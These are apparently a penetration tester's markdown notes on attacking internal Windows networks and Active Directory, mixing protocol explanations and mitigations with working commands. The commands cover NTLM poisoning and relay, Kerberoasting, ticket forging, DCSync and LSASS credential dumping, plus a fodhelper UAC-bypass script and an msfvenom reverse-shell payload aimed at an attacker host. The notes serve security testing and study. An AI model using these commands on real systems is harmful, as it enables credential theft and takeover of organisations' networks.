# internal

# to be added
- why smb ntlm via ssh didnt send creds?
- how Mitm6 works?
- If an attacker is intercepting a NTLM traffic of a client, can he relay it to the same machine that sends it?
- arp spoofing instead of llmnr?
- NetExec https://www.netexec.wiki/

# internal methodology

## host discovery
- get internal ip ranges
    - dhcp / routing table / DNS servers
    - check ips in received packets through tcpdump / responder
    - ping sweep through popular networks ranges
        * nmap -e INTERFACE -sn 10.1.0-255.1,10,254
    - try DNS queries using potential internal domains (ex: vpn.example.corp)
- ?arp-scan: great to scan local networks (supposily nmap -sn already do this)
- passive arp listener: stealthy way to discover local hosts

## scanning
- firstly, scan ports 80 and 443 (?+ 445) using full tcp handshake, after this do a complete scan
    - less noisy, avoids initial blocks
    - allow you to work while the full scan is running
- to discovery hosts up in a large network, it is possible to use network sweeping with nmap -sn
- the way port scanners work, not always they found all tcp opened ports, netcat can be more accurate
- the default nmap scan technique depends on the permissions (sS or sT)

## attacking
- start poisoning and save ntlm responses to break:
    * responder to poison nbtns/llmnr
    * ?mitm6
    * ?arp spoofing
- search smb targets, crackmapexec is good to check where signing is not required
    * ```cme smb REDE --gen-relay-list output.txt```
    * + ntlm relay saving hashes
- look for creds in smbs with open shares
- [AD password spraying](https://github.com/morkin1792/security-tests/main/internal.md#ad-attacks)
- check ftp anon login
    * ```nmap -n --script ftp-anon -p 21 -iL hosts.txt -oX ftp_results.txt```
- check nfs
    * ```nmap -n -Pn -p 111,2049 --script nfs-ls -iL hosts.txt -oX nfs_results.txt```
- quick ssh brute force (oracle:oracle, root:root)
- check smb null session
    * ```crackmapexec smb -u "" -p "" --local-auth --shares $(cat hosts.txt) > hosts_smb_local.txt```
    * ```crackmapexec smb -u "" -p "" -d DOMAIN --shares $(cat hosts.txt) > hosts_smb_domain.txt```
- check vnc cve (nmap script)
- check old windows versions in crackmapexec output
- if not stealth: nuclei
- analyse web apps (printers, actuator, big ip, ...)

# Windows / Active Directory

### Windows Concepts
- NTLM protocol -> authentication protocol where the client sends a NEGOTIATE, so the server answers with a challenge (CHALLENGE) and then client sends a response for it (AUTHENTICATE)
    - sometimes called "Net-NTLM"
    - the client's response is a hash of the server's challenge that uses the user's NT hash 
    - the credentials provided by the client could be from a local or domain user
    - the password never leaves the client
    - there are versions of the protocol (NTLMv1, NTLMv2)
- NTLM relay -> MiTM technique to impersonate the client
    - the attacker just relay the communication, without need to do modifications
    - As NTLM is an independent protocol that can be coupled in others (like HTTP, SMB), it is possible to do cross-protocol relay. Example: receive an NTLM HTTP request from the client and relay it to a server as an NTLM SMB message. 
- NTLM relay Mitigation
    - Force SMB / HTTP signing on all machines, solve for the specific protocol which uses NTLM
        - With signature it is still possible to do the MiTM and get the NTLM response, however, after authentication, the session packets have to be signed, so the attacker will not be able to create / modify packets
        - By default, SMB communications with domain controller requires signature, but for other machines it is not required
        - In SMBv2, signature no longer have the Disabled setting, but now if both are Enabled, unlike SMBv1, the packets will not be signed (one needs to be Required in v2).
        - In LDAP, signature is Negociated (equivalent to Enabled) by default, and when both are Negociated the packets will be signed.
    - Use kerberos instead of NTLMv2
- Pass the hash
    - NTLM protocol requires the client to send a response (for the challenge) that is created using the NT hash, therefore, when the NT hash is discovered it is possible to use it to authenticate even without knowing the plaintext password
    - the nt hash can be used in crackmapexec, smbclient, impacket-psexec, xfreerdp (windows 8/2012 only), etc
    - if it is a local user hash, it needs to be from the built-in Administrator since windows 7 (2014) (to be able to use admin privileges)
- Limiting Pass the hash
    - Avoid having the same local administration password on all workstations (Microsoft LAPS)
    - By default, UAC already doesn't allow to use administrative privileges from local accounts remotely, except if the user is the builtin Administrator (RID 500).
        - So, to limit PtH it is recommended to require UAC in administration tasks for all local accounts (even RID 500): set LocalAccountTokenFilterPolicy to 0 (default) and FilterAdministratorToken to 1 (not default), which still doesn't affect domain accounts.

- SID
    - generated by the Local Security Authority (LSA) for accounts and groups, when they are created
    - it cannot be changed
    - windows uses only SID to manage the access control
    - format: S-1-X-Y
    - 1 is the revision (there are no others currently)
    - X is the authority that issued the SID (5 -> NT Authority)
    - Y one or more sub authorities, in the end it contains the **RID**
    - the RID starts at 1000 for non builtin principals
    - SIDs with RID under 1000 are called well-known SIDs
        * ex: RID 500 is the builtin Administrator
            - S-1-5-domainidentifier-500
- SAM database
    - local user's passwords hashes are stored in SAM database
    - NT hashes (or LM hashes on legacy systems)
    - to decrypt SAM is needed to get the SYSTEM file.
- NTDS.DIT database
    - domain user's passwords hashes are stored in NTDS.DIT database
    - it uses the same hash algorithm as SAM database
- SECURITY registry (hklm\security) (LSA secrets)
    - stores domain cached credentials (DCC2), plaintext passwords (from accounts configured to start a service), NT hashes, ...
- DCC2 (Domain Cached Credentials version 2)
    - also known as MS-Cache v2, MScache or Mscash hash
    - DCC2 is a hash format of cached domain credentials used to allow authentication if a domain controller is unavailable
    - it does not expire, but dcc2 hashes **cannot be passed**
    - cracking: hashcat -m2100


### Active Directory
- There are 3 kinds of hosts: Domain Controller (DC), Server, Workstation
- By default, just admins can log in to the DCs (for both local and remote)
- Enterprise Admin > Domain Admin sometimes is not true. Ex: "Enterprise Admins have no default rights on workstations or member servers". Domain Admins are always in the local group Administrators on all systems joined to the domain. "DAs are all-powerful within their domains, while EAs have forest-wide privilege".
- RSAT (remote server administration tools) enables IT administrators to remotely manage roles and features in Windows Server using workstations

#### Kerberos
- Stateless protocol
- Default Windows authentication protocol since Windows Server 2003
- Different of NTLM, here the client starts the authentication with the KDC (Key Distribution Center)
    - KDC is a service that usually runs on the Domain Controller
        - KDC provides two services: an authentication service and a ticket granting service
- The authentication process starts when a network client makes an authentication request (AS-REQ) to the KDC
- If pre-authentication is enabled, the KDC will send an authentication reply (AS-REP) with a failure message asking the client to send an encrypted timestamp as part of the next AS-REQ
- When everything is ok, the KDC responds to the client with an AS-REP that has an encrypted TGT (ticket granting ticket).
- User password hashe must be stored in order to renew TGT tickets (that lasts 10 hours) without asking for the password again
    - they are stored in the Local Security Authority Subsystem Service (LSASS) process memory space
- When clients want to communicate with a service, they use the TGT ticket with the KDC to ask for a TGS ticket
- Finally, the client can uses the TGS ticket to access a specific domain service

#### AD enumeration
- Primary Domain Controller (PDC) - the DC that holds the most updated information
    - we should look for it to make our enumeration as accurate as possible
    - there can be only one PDC in a domain.
    - $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
- LDAP is an protocol used to clients be able to get information from DC. Other directory services use it as well.
    - Format: "LDAP://$PDC/$DN"
        - https://learn.microsoft.com/en-us/windows/win32/adsi/ldap-adspath
- Active Directory Services Interface (ADSI) is a set of interfaces built on COM4 that acts as an LDAP provider
    - $DN = ([adsi]'').distinguishedName 
- GUI tool to show users / groups of AD: Rundll32 dsquery.dll OpenQueryWindow
- It is possible to use C# / powershell to get AD infos with LDAP:
```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
(LDAPSearch -LDAPQuery "(cn=*robert*)").properties
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member
(LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=*domain admin*))").properties.member
LDAPSearch -LDAPQuery "(objectCategory=computer)"
```

- users who have not changed their password since the last password policy change, can have a weaker password than the required by the last policy

- PowerView: powershell functions to enumerate AD
```powershell
curl.exe -LO https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1
powershell -ep bypass
Import-Module .\PowerView.ps1
```
- powerview: get computer and domain infos
```powershell
Get-NetComputer | select operatingsystem,dnshostname
Get-NetDomain
Get-NetUser | select cn,pwdlastset,memberof
Convert-SidToName S-1-5-...-1104
```

- find if current user is a local admin in any domain machine
    * powerview: `Find-LocalAdminAccess`

- check authenticated users
    * powerview: `Get-NetSession -ComputerName $TARGET`
    * sysinternals: `PsLoggedOn \\target`

- SPN (service principal name) 
    - it is a identifier that kerberos uses to associate a service with an account in AD
    * listing spns with powerview: `Get-NetUser | select samaccountname,serviceprincipalname`
    * listing SPNs of an specific account: setspn.exe -L iis_service

- ACLs misconfigurations
    - An access control list (ACL) is a list of access control entries (ACE)
    - some interesting permissions to check:
        * GenericAll: Full permissions on object
        * GenericWrite: Edit certain attributes on the object
        * WriteOwner: Change ownership of the object
        * WriteDACL: Edit ACE's applied to object
        * AllExtendedRights: Change password, reset password, etc.
        * ForceChangePassword: Password change for object
        * Self (Self-Membership): Add ourselves to, for example, a group
    - powerview: `Find-InterestingDomainAcl | select ObjectDN,IdentityReferenceDN,ActiveDirectoryRights | ? {$_.IdentityReferenceDN -notmatch "DnsAdmins"} | Format-List`

- Group Policy Preferences (GPP) can contain passwords because they are often used to change local workstation passwords
    - GPP-stored passwords are encrypted but the key is public
        - `gpp-decrypt` can be used to decrypt (cpassword)

- Domain Shares
    - `net view \\DC1.corp.com`
    - `ls \\DC1.corp.com\share`
    - powerview: `Find-DomainShare -CheckShareAccess`

- BloodHound: Automated AD enumeration
    - first it is need to collect the data of the AD
        - `curl.exe -LO https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1`
        - `powershell -ep bypass`
        - `Import-Module .\Sharphound.ps1`
        - `Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\complete\path -OutputPrefix "corp"`
    - then, we can start bloodhound and import the zip to it
    - `MATCH p = (c:Computer)-[:HasSession]->(u:User) RETURN p`
    - `MATCH (c:Computer) RETURN c`
    - find all domain admins
    - find shortest paths to domain admins
        - mark objects as owned to filter

#### AD Attacks

##### poison (responder)
```sh
sudo responder -I eth0 -v # default mode, can denial very old services
-A # analyse mode, not poisoning, no dos
-b # basic http authentication
-wdF # ?wpad combo
-Pd  # ?
-D   # ?DHCP
--disable-ess 
```

##### poison + ntlm relay
- impacket-ntlmrelayx
    * -smb2support
    * -t TARGET
    * -tf TARGETSFILE          # multiple targets
    * -of HASHFILE             # save NTLM response in a file (it automatically add the suffix _ntlm)
    * -i                       # open smb shell locally, good if the user doesn't have admin permission, TODO: consider change by -socks option
    * -c "powershell -enc ..." # command execution

##### user enumeration via kerberos
* it does not lock out the accounts
* `ldapnomnom -server $dcIp -input names.txt --parallel 64`
* `kerbrute userenum -d corp.com --dc $kdcIp usernames.txt`
* `nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='corp.com',userdb=/root/user.txt $kdcIp`

##### choosing password
- default AD policy: Upper && Lower && numbers && 7 characters 
    - it can't contain the name of the user
    - Password1, Company123
- brazil common passwords:
    - Company@2023, Company2023
    - Mudar@123, Mudar123
- generate wordlist:
    - bopscrk

##### password spraying
- warning: **brute force can block accounts**
    * use `net accounts` to show the lockout policies
- via kerberos
    * fast
    * `kerbrute passwordspray -d corp.com --dc $kdcIp usernames.txt "Company123!"`
- via smb
    * slowest and noisy
    * `crackmapexec smb $domainJoinedMachine -u users.txt -p 'Company123!' -d corp.com --continue-on-success`
- via authenticated ldap
    * slow
    * https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
    * `.\Spray-Passwords.ps1 -Pass Company123! -Admin`

##### AS-REP roasting
- kerberos preauthentication is the first step of the authentication process (when the client send the AS-REQ)
- preauthentication is enabled by default
- if preauthentication is disabled for an user, anyone can send an AS-REQ on behalf of this user, and get a AS-REP
- AS-REP contains a session key (encrypted with the user hash) and a TGT ('signed' with krbtgt hash)
    - ?since it is required to have the session key in plaintext to generate a TGS, the TGT cannot be used to pass the ticket?
- However, the session key can be used as input to perform an **offline bruteforce attack**, aiming to discover the user password
- 1) Get the AS-REP
    * **having a user list**
        * impacket: `impacket-GetNPUsers -dc-ip $ip -request -outputfile asrep.hashes -usersfile users.txt corp.com/`
    * **with credentials**
        * powerview: `Get-DomainUser -PreauthNotRequired`
        * rubeus: `rubeus.exe asreproast /nowrap /outfile:asrep.hashes` 
        * impacket: `impacket-GetNPUsers -dc-ip $ip -request -outputfile asrep.hashes corp.com/knownuser`
- 2) Crack the hash: 
    * `hashcat -m 18200 asrep.hashes rockyou.txt -r best64.rule`
- Targeted AS-REP Roasting: with GenericWrite or GenericAll permissions on another AD user account, instead of just change their passwords, it is possible to modify the User Account Control value of the user to not require Kerberos preauthentication and then do the AS-REP roasting. It should be reversed after the hash is obtained.
- Mitigation: Enable preauth. If it is really necessary keep it disabled, at least the affected accounts should use very strong passwords, to let password cracking attacks impracticable.

##### TGS-REP Roasting (Kerberoasting)
- When a domain user requests a service ticket (TGS) for any service, the KDC generates a TGS without any permissions check, because the user and group memberships are added in the TGS. 
- So, the service receiving the TGS ticket can check the users permissions by itself.
- But yet it is possible to get the TGS, and it is encrypted with the hash of the service account
- It allows an offline bruteforce attack be performed, known as **Kerberoasting**, but just if the service **does not** run in the context of a **machine account**, a managed service account, or a group-managed service account, where the password is randomly generated, complex, and too long to be cracked.
- 1) Search SPNs (accounts for service) and get TGS_REP of them
    * impacket: `impacket-GetUserSPNs -dc-ip $ip -request -outputfile tgsrep.hashes corp.com/knownuser`
    * rubeus: `rubeus.exe kerberoast /outfile:tgsrep.hashes`
- 2) Crack the hash
    * `hashcat -m 13100 tgsrep.hashes rockyou.txt -r best64.rule`
- After a kerberoasting attack, create **silver tickets** can be useful
- Unauthenticated Kerberoasting: If there is a user with preauth disabled, it can be possible to use a list to check SPN accounts
    - check parameter -no-preauth in GetUserSPN.py https://tools.thehacker.recipes/impacket/examples/getuserspns.py (-userfile should contain a list of accounts to be checked)
- targeted Kerberoasting: with GenericWrite or GenericAll permissions on another AD user account, it is possible to set an SPN for the user (setspn.exe), and then execute the kerberoasting attack. It should be reversed after the hash is obtained.
- Mitigation: Avoid SPNs on user acconts. If necessary, use a really strong password.


#### Lateral movement
- ? check logs in other machines
    - ? event viewer > right-click on "Event Viewer (Local)" > "Connect to another computer" > DC address
- Try use credential / hash in other machines through:
    - RDP (3389/tcp)
    - WinRM (5985/tcp, 5986/tcp)
    - SMB shares (look for credentials) (**no admin**)
    - SMB (445/tcp) (admin required)
        * impacket: `impacket-psexec CORP\USER@ADDRESS -hashes HASHES`  # (interactive system shell, more functional)
        * impacket: `impacket-smbexec CORP\USER@ADDRESS -hashes HASHES` # (system shell, more stealthy)
        * impacket: `impacket-atexec CORP\USER@ADDRESS -hashes HASHES` # 
        * impacket: `impacket-wmiexec CORP\USER@ADDRESS -hashes HASHES` # (user shell, more noisy)
        * impacket: `impacket-dcomexec CORP\USER@ADDRESS -hashes HASHES` # (more noisy)
        * windows: `wmic /node:ADDRESS /user:USER /password:PASSWORD process call create "curl.exe ..."`
        * windows sysinternal: `./PsExec.exe -accepteula -i \\TARGET -u corp\user -p PASSWORD cmd`
    - SSH (22/tcp)
        * 1) Over pass the Hash
        * 2) Use the ticket: `ssh -o GSSAPIAuthentication=yes user@domain.local -vv`

##### Pass the ticket
- Idea: find/stole a TGT/TGS ticket and use it
- Ticket Granting Ticket (TGT) -> it can be used for generate TGS for all services the user has access, **default expiration time is 10 hours**
- Ticket Granting Service (TGS) -> just give access to a specific service, **apparentely** default expiration time is the same
    - it may be modified to try to access another service (check tgssub from impacket or Rubeus.exe tgssub, https://www.thehacker.recipes/ad/movement/kerberos/ptt#modifying-the-spn)
- 0) if not admin: look for tickets of the authenticated user
- 1) stole a ticket
    - mimikatz: `.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"`
    - dump lsass process memory, then extract tickets from it
        - check "windows privilege escalation" > "LSASS process memory" section
- 2) pass the ticket
    - <b>it IMPORTANT to use the hostname, not only the ip address, when authenticating with kerberos</b>
    - mimikatz:
        * `.\mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"`
        * `klist`
        * `.\PsExec.exe -accepteula \\$targetHostName cmd`
    - impacket:
        * `impacket-ticketConverter ticket.kirbi ticket.ccache`
        * `python impacket/examples/describeTicket.py ticket.ccache`
        * `export KRB5CCNAME=$(pwd)/ticket.ccache`
        * `impacket-psexec -k -no-pass -dc-ip $dcIpAddress -target-ip $targetIpAddress $targetHostName`

##### Pass the key / Over Pass the Hash
- it is a combination of passing the hash and passing the ticket
- Over pass the hash is a specific kind of pass the key where the attacker uses the rc4 key (nt hash)
- the idea is to use the NT hash (or AES key) to get a kerberos ticket (TGT), then pass the ticket
- <b>it IMPORTANT to use the hostname, not only the ip address, when authenticating with kerberos</b>
- impacket:
    - Get the ticket: 
        * `impacket-getTGT -hashes :$HASH corp.com/user -dc-ip $dcAddress`
            - for aes, change `-hashes` by `-aesKey`
    - Pass the ticket: 
        * `export KRB5CCNAME=$(pwd)/user.ccache`
        * `impacket-psexec -k -no-pass ...`
- mimikatz:
    - `.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:corp.com /user:$USER /rc4:$ntHASH" "exit"`

### Active Directory - Persistence

#### Silver Ticket (forging TGS tickets)
- Idea: forge TGS tickets using NT hash of the service account
- TGS is double signed
    - With NT hash of the account that is running the service
    - And with the NT hash of krbtgt
- Services can check only their own signature
- This optional verification between the SPN application and the KDC is called **PAC validation**
- If PAC validation is disabled and the attacker get NT hash or password of the service account, he can forge service tickets (TGS)
- these are the `silver tickets`
- Creating Silver Tickets
    - $SERVICEHASH -> NT hash of service account -> extract from memory
    - $DOMAINSID -> domain user SID removing RID (whoami /user)
    - $DOMAIN -> corp.com
    - $TARGETMACHINE -> web.target.com (apparently cannot be an ip address for mimikatz and http service )
    - $VALIDUSER -> existing domain user
    - Mimikatz
        - `mimikatz "kerberos::golden /sid:$DOMAINSID /domain:$DOMAIN /target:$TARGETMACHINE /service:http /rc4:$SERVICEHASH /user:$VALIDUSER /ptt" "exit"`
        - `klist` (it checks loaded tickets, and allows remove them using purge)
        - `iwr -UseDefaultCredentials http://$TARGETMACHINE`
    - Impacket
        * `impacket-ticketer -nthash $SERVICEHASH -domain-sid $DOMAINSID -domain $DOMAIN -spn cifs/$TARGETMACHINE $VALIDUSER`
        * `export KRB5CCNAME='/path/to/validuser.ccache'`
        * `impacket-psexec -k $SERVICEMACHINE`
- Mitigation: Enable PAC validation

#### Domain Controller Syncronization (dcsync attack)
- more stealthy way to get hashes from ntds 
- act as another DC asking for information
- the account needs to have the privileges: Replicating Directory Changes, Replicating Directory Changes All and Replicating Directory Changes in Filtered Set
    - default for members of Domain Admins, Enterprise Admins, and Administrators
- get from a specific user using domain-joined windows: `.\mimikatz.exe "lsadump::dcsync /dc:$DC /domain:$DOMAIN /user:krbtgt" "exit"`
- get from all domain users: `impacket-secretsdump -just-dc corp.com/Administrator:password@domaincontroller`

#### Golden Ticket (forging TGT tickets)
- over pass the hash attack
- requirements: Domain SID (whoami /user), KRBTGT hash (from DC ntds)
    - ?`.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /inject /name:krbtgt`
- create and pass the ticket
    - `.\mimikatz.exe "kerberos::golden /user:$USER /domain:corp.com /sid:$DOMAINSID /krbtgt:$HASH /ptt" "exit"`
    - `klist`
- or just create ticket
    - `.\mimikatz.exe "kerberos::golden /user:$USER /domain:corp.com /sid:$DOMAINSID /krbtgt:$HASH /ticket:golden_ticket.kirbi" "exit"`
- and then pass the ticket (**use hostname** instead of ip address to keep the authentication through kerberos)
- it is possible to impersonate any user having domain admin access, even if the target doesn't have it
- TO CHECK: ?if the account is disabled, the KDC will start to verify it only 20 minutes after the TGT ticket was generated
- one way to invalidate golden tickets is change the krbtgt password as twice (because kerberos keeps accepting the previous nt hash to avoid denial of service)

# Post Exploitation

- [upgrade shell](external.md#shell)
- privilege escalation
- pivoting
- check password in other machines / users
- lateral movement

### what if...
- the user do not have gui remote access:
    - but another one has gui access:
        - log in with the latter and use `runas`
        - use `schtasks` and schedule a task to run as this user (if user has batch logon privilege)
- the machine has rdp or winrm services but the port is not acessible:
    - remote port forwarding

### privilege escalation
- First of all, privilege escalation tools:
    - **PEASS-ng**, Seatbelt, 411Hall/JAWS
    - can be interesting **run PEASS again after obtained privileged access** to try discover more sensitive information
- If manual work is needed, also check:
    * If a web server is running as root / admin, try to create a web shell
    * all users
        - `cat /etc/password`
        - `net user`
        - `net user /domain`
    * current user's groups
        - look groups description, in Windows: groups can be member of other groups, the permission is inherited
        - `groups`
        - `whoami /groups`
    * look into some directories
        - linux: `/home`, `/etc`, `/tmp`, `/run/media`, `/opt`, `/mnt`, `/`
        - windows: `C:\`, `C:\Users`, `$env:TEMP`, `C:\Windows\Temp`
    * search files by extension
        - `find . | grep -Ei 'key|_rsa|\.(bat|ps1|sh|txt|zip|7z|rar|tar|tar\...|csv|bak|backup|kdbx|pub|pdf|doc|docx|xls|xlsx)$'`
        - `dir /S *.bat,*.ps1,*.sh,*.ini,*.txt,*.zip,*.7z,*.rar,*.csv,*.bak,*.backup,*.kdbx,*.pub,*.pdf,*.doc,*.docx,*.xls,*.xlsx`
        - `Get-ChildItem -Path . -Include *.bat,*.ps1,*.sh,*.ini,*.txt,*.zip,*.7z,*.rar,*.csv,*.bak,*.backup,*.kdbx,*.pub,*.pdf,*.doc,*.docx,*.xls,*.xlsx -File -Recurse -ErrorAction SilentlyContinue`
    * other partitions
        - `df -h`
        - `/etc/fstab`
        - `lsblk`
    * environment variables
        - `printenv`
    * command history
        - $HOME/.*history
        - `history`
        - `(Get-PSReadlineOption).HistorySavePath` #get powershell history location
            - $env:USERPROFILE\appdata\roaming\microsoft\windows\powershell\psreadline\*.txt
            - `Get-History`
            - powershell has Start-Transcript, it is similar to the unix command `script`
        - check Script Block logging
            - Open Event Viewer and navigate to the following log location: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational. Filter by Event ID 4104
            - can be get via shell, check winPEASS
- check cron / scheduled tasks
    * linux
        - `grep -i "CRON" /var/log/syslog`
            - ?`journalctl -xe | grep -i cron`
        - `ls -lah /etc/cron*`
        - `crontab -l`
        - ?systemctl list-timers
    * windows
        - `schtasks /query /v /fo table  | findstr /vi "system32" | findstr /v "COM handler"`
        - `schtasks /query /v /fo csv | ConvertFrom-CSV | Where {$_.Author -notmatch "Microsoft" -And $_."Task To Run" -notmatch "ystem32" -And $_."Task To Run" -notmatch "COM handler" } | ConvertTo-Csv | Get-Unique  | ConvertFrom-CSV`
        - `Get-ScheduledTask`

- check more specific linux/windows options

- bruteforce another users (hydra, kerbrute)
- running processes
    - `ps -elf`
    - `Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine | Format-Table -AutoSize`
    - `tasklist /v /FO list`
    - can we overwrite any elevated privilege process binary?
- verify listening ports, interfaces and **routes**
- exploits in installed softwares that run with elevated privilege
- kernel exploits

#### linux privilege escalation
- check passwd and shadow permissions
- `find / -writable -type f,d 2>/dev/null`
- `ps aux | grep -i pass`
- `sudo -l`
- https://gtfobins.github.io/
- suid/sgid binary
    - `find / -perm /u=s,g=s -type f 2>/dev/null`
    - exploiting:
        * gtfo
        * shared objects injection
            - search libraries
                - `strings bin_target | grep -i '\.so'`
                - `objdump -x bin_target | grep -i NEEDED`
                - `strace bin_target 2>&1 | grep -i '\.so'`
                - `ldd bin_target`
            - check if any shared library is writable by the current user
        * path injection: try to hook an command executed by the binary
            - strings bin_target
            - modifying $PATH
            - `function ls() { printf 'it works'; } && export -f ls`
- capabilities
    - `getcap -r / 2>/dev/null | grep -iE 'set[ug]id'`
- if current user is in the docker group -> `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
- linux specific tool: `./unix-privesc-check standard > upc_output.txt`

#### windows privilege escalation
- try log in on other hosts with the current credential OR using NTLM relay
    - current user can be local admin there
- check smb shares
- search exe being executed by privilege user:
    - show services exe paths
        * need interative logon (rdp, physical), but can work in reverse shell
        * `Get-CimInstance -ClassName win32_service | Select PathName,StartName | findstr /vi "windows\system32"`
            - `Get-CimInstance -ClassName win32_service | Select PathName,Name,State,StartMode,StartName | Where-Object { $_.PathName -match "Target" }`
    - check if the executable can be overwrited
        * `icacls C:\path\file.exe`
            - F: Full access
            - M: Modify access
            - RX: Read and execute access
            - R: Read-only access
            - W: Write-only access
            - AD: Append data/add subdirectory
        * 1) The file owner can always modify the permissions to be able to access it
        * 2) administrator can change file owner
    - check if there is unquoted spaces in the service path
        - ... | findstr /vi "\"""
        - if the path is **C:\Program Files\My Program\My service\service.exe** and it is **unquoted**, windows will try in order:
            * C:\Program.exe
            * C:\Program Files\My.exe
            * C:\Program Files\My Program\My.exe
            * C:\Program Files\My Program\My service\service.exe
    - check if there is a DLL that can be hijacked
        - 1) download the services, suspicious softwares, AV to a test environment
        - 2) open Process Monitor (procmon)
        - 3) add the filters (Ctrl+L):
            * Operation is CreateFile
            * Result is NAME NOT FOUND
            * Process Name contains target.exe
    - write the new exe/dll
        - A **possibility** is to create a user:
            * `net user userA pass123! /add`
            * `net localgroup administrators userA /add`
        - But for it the escalated user needs to be **admin**, so generate a shell is more guaranteed
            * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER LPORT=$PORT -f dll -o a.dll`
        * mingw gcc needs **--shared** to generate dll
        * `move` command can allows to change the exe location even if it the file is in use
    - restart service 
        * `net stop ServiceName ; net start ServiceName`
        * `Restart-Service ServiceName -Force`
        * restart the machine (for auto StartMode services)
- try abuse privileges
    - check user privileges: `whoami /priv`
    - SeImpersonatePrivilege, SeBackupPrivilege, SeRestorePrivilege, SeAssignPrimaryToken, SeLoadDriver, SeDebug may lead to privilege escalation
    - abuse the privilege SeImpersonatePrivilege
        * https://github.com/itm4n/PrintSpoofer
        * https://github.com/CCob/SweetPotato
    - abusing SeBackupPrivilege
        * get NT hashes saving the SAM/SYSTEM with reg save
- (Active Directory) check ACLs misconfiguration
- more in https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- windows specific tool: https://github.com/bitsadmin/wesng

- from admin to nt authority/system
    - ?schtasks
    - psexec
    - change binary (or do dll hijacking) of a windows utility (sethc, osk)
##### UAC
- Administrative users have two access tokens, a standard user token (filtered admin token) and a administrator token (that triggers the UAC to be used).
- What happen when administration tasks are performed remotely?
    - Either they are requested by an domain account that is member of the "Administrators" group of the host, in which case the UAC is not activated for this account, and the administration tasks are already allowed.
    - Or they are requested by a local account that is member of the host's "Administrators" group, in which case by default the UAC is required for all except the built-in administrator account (RID 500) (check LocalAccountTokenFilterPolicy, FilterAdministratorToken)
        - Even so, it can be possible to find a bypass for uac, as shown below:
1) bypassing uac via foldhelper
```powershell
# for windows 10/11
reg add "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" 
$arg = "C:\Users\box\Desktop\wintest.exe" # apparently do not work with .ps1
$registryPath = "HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command"
Set-ItemProperty -Path $registryPath -Name "(Default)" -Value "$arg"
Set-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value ""
Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep 2
Remove-Item -Path "HKCU:\SOFTWARE\Classes\ms-settings" -Recurse -Force
```
2) bypassing uac via schtasks with password
- it is needed to know the password of an administrative account to create a task using it:
    * schtasks ... /ru adminjohn /rp john123


### windows - dumping creds, hashes, tickets
- **from lsa secrets, sam, ntds**    
    - `impacket-secretsdump corp/user@target -hashes :NTHASH`
    - crackmapexec
        * --lsa  # uses impacket-secretsdump
        * --sam  # dumps nt hashes from sam
        * --ntds # dumps nt hashes from ntds
    - manually
        * %SystemRoot%/ntds/ntds.dit
        * %SystemRoot%/system32/config/sam
        * %SystemRoot%/system32/config/system
        * %SystemRoot%/system32/config/security
        - 1) getting sam, system, security (for lsa secrets)
            - A) with reg.exe
                - `reg.exe save hklm\sam c:\sam.save`
                - `reg.exe save hklm\system c:\system.save`
                - `reg.exe save hklm\security c:\security.save`
            - B) using volume shadow
                - create: `vssadmin create shadow /for=C:`
                - listing: `vssadmin list shadows`
                - get file: `copy $ShadowCopyName\file DEST`
                - remove: `vssadmin delete shadows /shadow=$ShadowCopyId`
        - 2) extracting hashes/creds: `impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL`
- **from LSASS process memory**
    - `lsassy -u $USER -H $HASH $NETWORK`
    - mimikatz -> an exploit and a tool for extract credentials/hashes/tickets from windows machines, it needed to be executed with admin privileges
        - privilege::debug          # enable SeDebugPrivilege access (allows to debug all users' processes)
        - token::elevate            # elevate user privileges to SYSTEM
        - sekurlsa::logonPasswords  # attempt extract passwords and hashes from some sources
        - lsadump::sam              # extract hashes from sam
        - lsadump::lsa /patch
        - lsadump::cache            # extract dcc hashes
        - sekurlsa::tickets         # show kerberos' tickets in memory
        - `.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "exit"`
    
    - manually
        - 1) dump lsass process memory
            - task manager > Details > lsass.exe > Create dump file
            - procdump -> a Windows SysInternals tool that can be used to create memory dumps of processes
                - `$id=$(get-process lsass | select id).Id`
                - `procdump.exe -accepteula -64 -ma $id lsass.dmp`
            - comsvcs.dll -> using a native DLL
                - `tasklist /fi "imagename eq lsass.exe"`
                - `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $PID c:\users\user\lsass.dmp full`
        - 2) extracting hashes from dump
            - using mimikatz (choose os version and architecture as similar as possible)
                * sekurlsa::minidump C:\lsass.dmp
                * sekurlsa::logonPasswords
            - using pypykatz
                * `pypykatz lsa minidump lsass.dmp -k krb_tickets`
- other methods
